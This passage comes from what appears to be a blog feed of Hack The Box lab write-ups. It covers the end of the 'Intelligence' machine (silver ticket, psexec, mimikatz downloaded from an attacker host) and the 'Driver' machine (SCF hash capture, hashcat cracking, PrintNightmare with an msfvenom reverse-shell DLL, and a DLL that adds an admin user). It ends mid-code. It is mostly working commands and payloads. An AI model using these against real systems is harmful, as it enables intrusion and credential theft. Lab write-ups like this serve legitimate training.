$ pywerview get-netcomputer -w intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -t dc.intelligence.htb  --computername svc_int.intelligence.htb --attribute name msds-allowedtodelegateto useraccountcontrol
msds-allowedtodelegateto: WWW/dc.intelligence.htb
name:                     svc_int
useraccountcontrol:       ['WORKSTATION_TRUST_ACCOUNT', 'TRUSTED_TO_AUTH_FOR_DELEGATION']
</code></pre>
<p>It is now clear that from machine svc_int, we have delegation privileges on dc.intelligence.htb. What we are missing here are creds for svc_int but we can get the hash for them with impacket <code>gMSAdumper</code>:</p>
<pre><code>git clone https://github.com/micahvandeusen/gMSADumper
cd gMSADumper
python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l dc.intelligence.htb
Users or groups who can read password for svc_int$:
 &gt; DC$
 &gt; itsupport
svc_int$:::c699eaac79b69357d9dabee3379547e6
</code></pre>
<p>We can&rsquo;t crack this hash, but we can perform a Silver Ticket Attack:</p>
<h2 id="silver-ticket-attack">Silver ticket attack</h2>
<h3 id="obtain-a-silver-ticket">Obtain a silver ticket</h3>
<pre><code>python3 getST.py -dc-ip 10.10.10.248 -spn WWW/dc.intelligence.htb 'INTELLIGENCE.HTB/svc_int\$' -impersonate Administrator -hashes :c699eaac79b69357d9dabee3379547e6
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
</code></pre>
<p>There is problem with the clock that needs to be synced with AD:</p>
<pre><code>sudo apt-get install ntpdate
sudo apt-get install chrony
sudo timedatectl set-ntp true
sudo ntpdate  10.10.10.248
25 Oct 00:37:47 ntpdate[7818]: step time server 10.10.10.248 offset 25200.420074 sec
</code></pre>
<p>We can retrive the silver ticket:</p>
<pre><code>python3 getST.py -dc-ip 10.10.10.248 -spn WWW/dc.intelligence.htb 'INTELLIGENCE.HTB/svc_int\$' -impersonate Administrator -hashes :c699eaac79b69357d9dabee3379547e6
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
</code></pre>
<h3 id="kerberos-login-samba">Kerberos login Samba</h3>
<p>We can now reuse this ticket to connect cifs shares:</p>
<pre tabindex="0"><code>export KRB5CCNAME=Administrator.ccache
pip3 install pycrypto
python3 ./smbclient.py Administrator@dc.intelligence.htb -k -no-pass
Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# use C$
# cd Users/Administrator/Desktop
# cat root.txt
a9812c620864d1a0cc46204bfadfb96a
</code></pre><h3 id="obtain-an-admin-shell-with-psexec">Obtain an admin shell with psexec</h3>
<pre><code>python3 ./psexec.py intelligence.htb/Administrator@dc.intelligence.htb -k -no-pass -dc-ip 10.10.10.248 -port 445

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file srIwNEUx.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service kVxd on dc.intelligence.htb.....
[*] Starting service kVxd.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; cd ../../Users/Administrator/Desktop

C:\Users\Administrator\Desktop&gt; type root.txt
a9812c620864d1a0cc46204bfadfb96a
</code></pre>
<pre tabindex="0"><code>
A bit further exploration, we can even use powershell:

</code></pre><pre><code>C:\Users\Administrator\Desktop&gt; help

 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 lput {src_file, dst_path}   - uploads a local file to the dst_path RELATIVE to the connected share (ADMIN$)
 lget {file}                 - downloads pathname RELATIVE to the connected share (ADMIN$) to the current local dir
 ! {cmd}                    - executes a local shell cmd

C:\Windows\system32&gt; hostname
dc

C:\Windows\system32&gt; dir \\dc.intelligence.htb\C$
 Volume in drive \\dc.intelligence.htb\C$ has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of \\dc.intelligence.htb\C$

04/18/2021  05:52 PM    &lt;DIR&gt;          inetpub
04/18/2021  05:50 PM    &lt;DIR&gt;          IT
06/29/2021  02:30 PM             5,510 License.txt
04/18/2021  05:38 PM    &lt;DIR&gt;          PerfLogs
04/18/2021  05:23 PM    &lt;DIR&gt;          Program Files
04/18/2021  05:21 PM    &lt;DIR&gt;          Program Files (x86)
04/18/2021  06:20 PM    &lt;DIR&gt;          Users
10/24/2021  10:47 AM    &lt;DIR&gt;          Windows
               1 File(s)          5,510 bytes
               7 Dir(s)   5,986,734,080 bytes free

C:\Windows\system32&gt; powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent()


AuthenticationType : Negotiate
ImpersonationLevel : None
IsAuthenticated    : True
IsGuest            : False
IsSystem           : True
IsAnonymous        : False
Name               : NT AUTHORITY\SYSTEM
Owner              : S-1-5-32-544
User               : S-1-5-18
Groups             : {S-1-5-32-544, S-1-1-0, S-1-5-11}
Token              : 3024
AccessToken        : Microsoft.Win32.SafeHandles.SafeAccessTokenHandle
UserClaims         : {http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name: NT AUTHORITY\SYSTEM,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid: S-1-5-18,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid: S-1-5-32-544,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid: S-1-1-0...}
DeviceClaims       : {}
Claims             : {http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name: NT AUTHORITY\SYSTEM,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid: S-1-5-18,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid: S-1-5-32-544,
                     http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid: S-1-1-0...}
Actor              :
BootstrapContext   :
Label              :
NameClaimType      : http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name
RoleClaimType      : http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid

PS C:\Windows\system32&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name

Name
----
NT AUTHORITY\SYSTEM

PS C:\Windows\system32&gt; Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    371      32    12220      20108       0.11   2208   0 certsrv
     85       5      908       4136       0.02   2264   0 CExecSvc
    102       6     2816       4768       0.03   1616   0 cmd
    166      11     6880      16100       0.11   3508   1 conhost
    122       8     6420      10656       0.05   4788   0 conhost
    395      16     2100       5304       0.28    356   0 csrss
    178       9     1700       4992       0.09    452   1 csrss
    394      32    16344      22864       1.19   2272   0 dfsrs
    185      12     2388       7824       0.02   2752   0 dfssvc
    255      13     4004      13676       0.13   3292   0 dllhost
  10373    7401   130804     128272       0.80   2332   0 dns
     49       6     1368       3984       0.06    808   0 fontdrvhost
     49       6     1488       4428       0.06    816   1 fontdrvhost
      0       0       56          8                 0   0 Idle
     88       7      960       3716       0.00   2856   0 IsJXdneN
    130      12     1960       5712       0.02   2400   0 ismserv
     97       7      984       3892       0.02   1112   0 kQHuUTqv
     98       8     1104       3776       0.02   3380   0 KWfRWZsr
    312      16     2964      13860       0.08   3436   1 LogonUI
   2012     177    70620      67384      13.13    584   0 lsass
    471      33    53444      67664       4.33   2252   0 Microsoft.ActiveDirectory.WebServices
    224      13     2912      10412       0.05   3712   0 msdtc
    566      30    52712      61800       2.55   4572   0 powershell
     83       6      892       3696       0.00   5072   0 QSdSjBVH
      0      11      248      16732       1.94     88   0 Registry
    488      12     4516      11128       0.80    572   0 services
     53       3      528       1232       0.28    256   0 smss
    118      14     3140       7396       0.05    292   0 svchost
    206      12     1700       7464       0.05    304   0 svchost
    211       9     2108       7732       0.09    568   0 svchost
    249      15     3000      12072       0.91    648   0 svchost
    293      13     9196      13692       5.98    724   0 svchost
    427       9     2792       9140       0.28    756   0 svchost
     86       5      888       3964       0.00    788   0 svchost
    293      12     2652       9268       0.19    824   0 svchost
    472      19     3324       9900       0.72    912   0 svchost
    217      11     2364      10132       1.75    928   0 svchost
    233      10     1676       6984       0.05    944   0 svchost
    231      12     2704       8876       0.44   1088   0 svchost
    119       7     1192       5560       0.02   1188   0 svchost
    316      17     3768      13096       0.45   1212   0 svchost
    376      31     7664      15268       0.50   1264   0 svchost
    205      12     2148       8860       0.53   1304   0 svchost
    210      11     2400       8764       0.50   1352   0 svchost
    133       7     1192       5892       0.00   1368   0 svchost
    155       8     1740       7192       0.11   1436   0 svchost
    176       9     1728       8408       0.03   1464   0 svchost
    404      16    10972      20216       8.47   1480   0 svchost
    458      16     3220      11856       0.17   1560   0 svchost
    233      24     3352      12492       0.11   1636   0 svchost
    356      16     4328      12544       0.19   1744   0 svchost
    277      10     2212       8424       0.19   1860   0 svchost
    166      12     3840      11020       0.09   2216   0 svchost
    119       7     1152       5612       0.00   2228   0 svchost
    389      18    14720      27880       1.66   2288   0 svchost
    137       8     1496       6304       0.00   2424   0 svchost
    229      14     4688      11908       0.08   2432   0 svchost
    219      12     2744      10348       0.08   2736   0 svchost
    292      16     4580      16916       0.17   3076   0 svchost
    147       9     1588       6584       0.02   4008   0 svchost
    247      14    10324      11528       3.17   4068   0 svchost
    281      20     8172      13576       0.11   5092   0 svchost
   1140       0      192        156      12.50      4   0 System
    213      16     2460      10808       0.09   3108   0 vds
    176      12     3292      10888       0.11   2728   0 VGAuthService
    377      22     8936      21912       2.05   2452   0 vmtoolsd
    171      11     1444       7052       0.11    432   0 wininit
    234      11     2564      10860       0.25    504   1 winlogon
    327      16     8500      17592      12.13   3428   0 WmiPrvSE
     83       6      888       3692       0.02   3232   0 xVBpPrAm
</code></pre>
<h2 id="mimikatz">mimikatz</h2>
<pre><code>powershell -c &quot;Invoke-WebRequest -Uri http://10.10.14.10/mimikatz.exe -OutFile mimikatz.exe&quot;
mimikatz.exe &quot;token::elevate&quot; &quot;lsadump::sam&quot; &quot;exit&quot;
User : Administrator
  Hash NTLM: 0054cc2f7ff3b56d9e47eb39c89b521f
</code></pre>
<p>We can&rsquo;t crack this password on hashes.com</p>
]]></content></item><item><title>HTB - Driver</title><link>https://0xade1.github.io/posts/2021/10/htb-driver/</link><pubDate>Wed, 20 Oct 2021 13:48:42 +0800</pubDate><guid>https://0xade1.github.io/posts/2021/10/htb-driver/</guid><description>rustscan rustscan -a 10.10.11.106 -- -A -sCV Open 10.10.11.106:80 Open 10.10.11.106:135 Open 10.10.11.106:445 PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn't have a title (text/html; charset=UTF-8). 135/tcp open msrpc syn-ack Microsoft Windows RPC 445/tcp open microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s | p2p-conficker: | Checking for Conficker.</description><content type="html"><![CDATA[<h2 id="rustscan">rustscan</h2>
<pre tabindex="0"><code>rustscan -a 10.10.11.106 -- -A -sCV
Open 10.10.11.106:80
Open 10.10.11.106:135
Open 10.10.11.106:445

PORT    STATE SERVICE      REASON  VERSION
80/tcp  open  http         syn-ack Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp open  msrpc        syn-ack Microsoft Windows RPC
445/tcp open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 48837/tcp): CLEAN (Timeout)
|   Check 2 (port 18115/tcp): CLEAN (Timeout)
|   Check 3 (port 26928/udp): CLEAN (Timeout)
|   Check 4 (port 27042/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-10-20T12:48:04
|_  start_date: 2021-10-20T12:05:38
</code></pre><p>Samba shares access is not authorized:</p>
<pre><code>ctf@014202efa8c8:~$ smbmap -H 10.10.11.106
[+] Finding open SMB ports....
[!] Authentication error on 10.10.11.106
[!] Authentication error on 10.10.11.106


ctf@014202efa8c8:~$ smbclient -N -L //10.10.11.106
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre>
<p>Web exploration, after login with admin:admin (password guess), we are able to upload a driver firmware.</p>
<h1 id="scf-file-attack-on-smb-share">SCF file attack on SMB Share</h1>
<p>One possible attack path is to use responder to steal some hashes after uploading a file with a reference to our attacker machine: <code>\\10.10.14.51\shares\whateverfile</code></p>
<p>Let&rsquo;s first craft a <a href="https://filext.com/file-extension/SCF">Shell Command File (SCF)</a> that we will upload as a firmware file. The SCF File Attack on SMB shares is described in detail on this blog: <a href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a></p>
<pre><code>$ cat driver.scf
[Shell]
Command=2
IconFile=\\10.10.14.51\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
</code></pre>
<p>Then we start responder and upload our file. We imediately capture a hash :)</p>
<pre><code>sudo python3 Responder.py -I eth0 -wrf
[..]
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 172.19.0.1
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:9979e523ef925537:DAF3FF8F21B7767E730CA3DB356DCE75:0101000000000000000491E8FBC5D701022CF15A4B874DF100000000020008004D005A005300560001001E00570049004E002D005A003900470049004D0058003100540035005000450004003400570049004E002D005A003900470049004D005800310054003500500045002E004D005A00530056002E004C004F00430041004C00030014004D005A00530056002E004C004F00430041004C00050014004D005A00530056002E004C004F00430041004C0007000800000491E8FBC5D70106000400020000000800300030000000000000000000000000200000864D7388FEA0C17408B4583ADF831615E2595E8E9751938DB92CA7184C85E2020A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0035003100000000000000000000000000
[*] Skipping previously captured hash for DRIVER\tony
[..]
</code></pre>
<p>It get immediately cracked with hashcat:</p>
<pre><code>$ cat Responder/logs/*txt &gt; ~/hashes.txt
$ hashcat -m 5600  ~/hashes.txt /opt/dictionaries/rockyou.txt -o ~/cracked.txt --force
$ tail -1 ~/cracked.txt | cut -d&quot;:&quot; -f 7
liltony
</code></pre>
<p>We can now revisit those samba shares. But we don&rsquo;t have enough privileges to access the shares.</p>
<pre><code>$ smbclient -U tony -L \\10.10.11.106
Enter WORKGROUP\tony's password:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
</code></pre>
<p>I simply create an alias for crackmapexec:</p>
<pre><code>alias crackmapexec='docker run -it --rm --name crackmapexec byt3bl33d3r/crackmapexec:latest'
</code></pre>
<p>List shares:</p>
<pre><code>crackmapexec smb 10.10.11.106 -u tony -p liltony --shares
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106    445    DRIVER           [+] DRIVER\tony:liltony
SMB         10.10.11.106    445    DRIVER           [+] Enumerated shares
SMB         10.10.11.106    445    DRIVER           Share           Permissions     Remark
SMB         10.10.11.106    445    DRIVER           -----           -----------     ------
SMB         10.10.11.106    445    DRIVER           ADMIN$                          Remote Admin
SMB         10.10.11.106    445    DRIVER           C$                              Default share
SMB         10.10.11.106    445    DRIVER           IPC$                            Remote IPC
</code></pre>
<h2 id="shell-as-tony">Shell as Tony</h2>
<pre><code>sudo gem install winrm winrm-fs stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 10.10.11.106 -u tony -p liltony
[..]
*Evil-WinRM* PS C:\Users\tony\Documents&gt; cd ../Desktop
*Evil-WinRM* PS C:\Users\tony\Desktop&gt; dir


    Directory: C:\Users\tony\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/20/2021   5:06 AM             34 user.txt


*Evil-WinRM* PS C:\Users\tony\Desktop&gt; type user.txt
1f34ff2a518534c1034637701722b0ff
</code></pre>
<h2 id="printnightmare">Printnightmare</h2>
<p>We can verify we are indeed vulnerable to Printnightmare:</p>
<pre><code>rpcdump.py @10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol
</code></pre>
<p>Checkout an exploit</p>
<pre><code>$ git clone https://github.com/calebstewart/CVE-2021-1675.git
$ mv CVE-2021-1675 calebstewart
$ cd calebstewart
$ ls
CVE-2021-1675.ps1  README.md  nightmare-dll
</code></pre>
<p>Upload the exploit with evil-winrm, then exectute:</p>
<pre><code>_Evil-WinRM_ PS C:\Users\tony\Music&gt; upload /home/ctf/htb/driver/calebstewart/CVE-2021-1675.ps1
_Evil-WinRM_ PS C:\Users\tony\Music&gt; Import-Module .\cve-2021-1675.ps1
File C:\Users\tony\Music\cve-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1

- Import-Module .\cve-2021-1675.ps1

    + CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
    + FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand
</code></pre>
<p>We are not able to modify the ExecutionPolicy</p>
<pre><code>*Evil-WinRM* PS C:\Users\tony\Music&gt; Set-ExecutionPolicy Unrestricted
Access to the registry key 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' is denied.
At line:1 char:1
+ Set-ExecutionPolicy Unrestricted
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], UnauthorizedAccessException
    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.SetExecutionPolicyCommand
</code></pre>
<p>We are not allowed to execute powershell script, so we have to try another exploit</p>
<h2 id="printnightmare-exploitation">PrintNightmare exploitation</h2>
<p>For this exploit I have to upload a DLL though samba share, so I will start a local smbserver for payload delivery, and msfvenom to get a windows TCP reverse shell.</p>
<pre><code>$ git clone https://github.com/cube0x0/CVE-2021-1675
$ mv CVE-2021-1675 cube0x0
$ cd cube0x0
$ ls
CVE-2021-1675.py  Images  README.md  SharpPrintNightmare
</code></pre>
<p>This script requires a modified version of impacket:</p>
<pre><code>sudo pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
#curl -OL https://github.com/SecureAuthCorp/impacket/releases/download/impacket_0_9_23/impacket-0.9.23.tar.gz
#cd impacket-0.9.23
cd impacket
sudo python3 ./setup.py install
</code></pre>
<h3 id="payload-preparation">Payload preparation</h3>
<pre><code>msfvenom -a x64 -l platforms
msfvenom -a x64 --platform windows -l payloads | grep reverse_tcp
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp --list-options
msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=10.10.14.51 LPORT=9000 -f dll -o /data/rev.dll
</code></pre>
<h3 id="payload-delivery">Payload delivery</h3>
<p>Impacket has a nice python smbserver</p>
<pre><code>smbserver.py -smb2support -username test -password test -port 445 test $(pwd)
</code></pre>
<p>Verify the smb share is accessible from the windows target:</p>
<pre><code>*Evil-WinRM* PS C:\Users\tony\Documents&gt; net use z: \\10.10.14.51\test /user:test test
The command completed successfully.

*Evil-WinRM* PS C:\Users\tony\Documents&gt; dir z:


    Directory: z:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/20/2021   8:29 AM                calebstewart
d-----       10/20/2021   8:47 AM                cube0x0
-a----       10/20/2021   6:43 AM             94 driver.scf
-a----       10/20/2021  10:04 AM            592 evildll.cpp
-a----       10/20/2021  10:38 AM           5120 rev.dll
</code></pre>
<h2 id="delivery">Delivery</h2>
<p>We have to restart the smb server without authentication</p>
<pre><code>smbserver.py -smb2support -port 445 test $(pwd)
</code></pre>
<p>Then we start a nc listener and we execute the exploit:</p>
<pre><code>python3 cube0x0/CVE-2021-1675.py driver.htb/tony:liltony@10.10.11.106 '\\10.10.14.51\test\rev.dll'
[*] Connecting to ncacn_np:10.10.11.106[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.14.51\test\rev.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...
──────────────────────────────────────────────────────────────
_  driver rlwrap nc -lnvp 9000
Listening on 0.0.0.0 9000
Connection received on 172.19.0.1 60054
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system
</code></pre>
<p>We can get the root flag:</p>
<pre><code>C:\Windows\system32&gt;cd ../../Users/Administrator/Desktop
C:\Users\Administrator\Desktop&gt;type root.txt
type root.txt
cfd835d90e6321f2703569320401aa2e
</code></pre>
<h2 id="cross-compilation-of-dlls-from-linux">Cross compilation of DLLs from Linux</h2>
<p>Given a custom DLL to create an admin user <strong>bob:Pasword123</strong>, we can cross-compile directly from Linux with:</p>
<pre><code>sudo apt-get install mingw-w64
x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp
</code></pre>
<p>evildll.cpp:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;windows.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
</span><span style="color:#ff79c6"></span>

<span style="color:#6272a4">// Here so I remember how to compile it.
</span><span style="color:#6272a4">// sudo apt-get install mingw-w64
</span><span style="color:#6272a4">// x86_64-w64-mingw32-gcc -shared -o evil.dll evildll.cpp
</span><span style="color:#6272a4"></span>
<span style="color:#ff79c6">extern</span> <span style="color:#f1fa8c">&#34;C&#34;</span> <span style="color:#ff79c6">__declspec</span>(dllexport) <span style="color:#8be9fd">int</span> DnsPluginInitialize(PVOID a1, PVOID a2)
{
  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
}

<span style="color:#ff79c6">extern</span> <span style="color:#f1fa8c">&#34;C&#34;</span> <span style="color:#ff79c6">__declspec</span>(dllexport) <span style="color:#8be9fd">int</span> DnsPluginCleanup()
{
  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
}

<span style="color:#ff79c6">extern</span> <span style="color:#f1fa8c">&#34;C&#34;</span> <span style="color:#ff79c6">__declspec</span>(dllexport) <span style="color:#8be9fd">int</span> DnsPluginQuery(PSTR a1, WORD a2, PSTR a3, PVOID a4)
{
  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>;
}


BOOL WINAPI <span style="color:#50fa7b">DllMain</span>(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    <span style="color:#ff79c6">switch</span> (fdwReason)
    {
    <span style="color:#ff79c6">case</span> <span style="color:#8be9fd;font-style:italic">DLL_PROCESS_ATTACH</span>:
        system(<span style="color:#f1fa8c">&#34;net.exe user bob Password123 /add&#34;</span>);
        system(<span style="color:#f1fa8c">&#34;net.exe localgroup administrators bob /add&#34;</span>);
